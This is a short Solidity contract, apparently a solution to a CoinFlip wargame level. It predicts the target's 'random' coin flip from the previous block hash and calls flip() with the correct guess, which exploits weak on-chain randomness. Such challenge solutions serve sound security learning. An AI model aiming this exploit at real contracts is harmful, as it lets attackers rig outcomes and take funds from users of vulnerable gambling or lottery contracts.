// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        CoinFlip coinFlip = CoinFlip(contractAddress);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = (blockValue / FACTOR) == 1 ? true : false;
        // console.log("Flipping coin to %s", side);
        bool actualCoin = coinFlip.flip(side);
        // console.log("Flipped coin is %s", actualCoin);
    }
}
